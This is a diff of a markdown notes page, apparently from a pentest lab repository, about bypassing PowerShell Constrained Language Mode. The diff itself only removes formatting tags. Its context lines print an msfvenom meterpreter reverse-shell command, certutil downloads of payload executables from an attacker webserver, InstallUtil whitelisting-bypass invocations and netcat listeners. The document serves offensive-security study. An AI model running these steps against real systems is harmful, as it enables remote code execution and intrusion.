@@ -19,9 +19,6 @@ The following powershell code runner is required and hosted on kali webserver (p
 * Reference: ToolLibrary/CodeRunners/powershellCodeRunner-32.ps1\
   Reference: ToolLibrary/CodeRunners/powershellCodeRunner-64.ps1
 
-
-
-{% code overflow="wrap" %}
 ```bash
 # payload for the powershellCodeRunner 32-bit
 ┌──(kali㉿kali)-[~]
@@ -31,11 +28,9 @@ The following powershell code runner is required and hosted on kali webserver (p
 ┌──(kali㉿kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.165 LPORT=8080 EXITFUNC=thread -f ps1
 ```
-{% endcode %}
 
 ### Execution Steps
 
-{% code overflow="wrap" %}
 ```bash
 # setup netcat listener
 ┌──(kali㉿kali)-[~]
@@ -44,7 +39,6 @@ The following powershell code runner is required and hosted on kali webserver (p
 # Download file via certutil -urlcache -f http://ip/CLMBypass-shell.exe shell.exe
 PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
 ```
-{% endcode %}
 
 ### Compiled Payload Location
 
@@ -58,7 +52,6 @@ will run a reverse shell and require netcat listener on designated IP address an
 
 ### Execution Steps
 
-{% code overflow="wrap" %}
 ```bash
 # setup netcat listener
 ┌──(kali㉿kali)-[~]
@@ -67,7 +60,6 @@ will run a reverse shell and require netcat listener on designated IP address an
 # Download file via certutil -urlcache -f http://ip/CLMBypass-shell.exe shell.exe
 PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
 ```
-{% endcode %}
 
 ### Compiled Payload Location
 
@@ -85,7 +77,6 @@ Invoke-ReflectivePEInjection.ps1 file hosted on attacker webserver (default port
 
 ### Execution Steps
 
-{% code overflow="wrap" %}
 ```bash
 # setup netcat listener
 ┌──(kali㉿kali)-[~]
@@ -98,7 +89,6 @@ Invoke-ReflectivePEInjection.ps1 file hosted on attacker webserver (default port
 # Download file via certutil -urlcache -f http://ip/CLMBypass-dll.exe dll.exe
 PS > C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U dll.exe
 ```
-{% endcode %}
 
 ### Compiled Payload Location
 
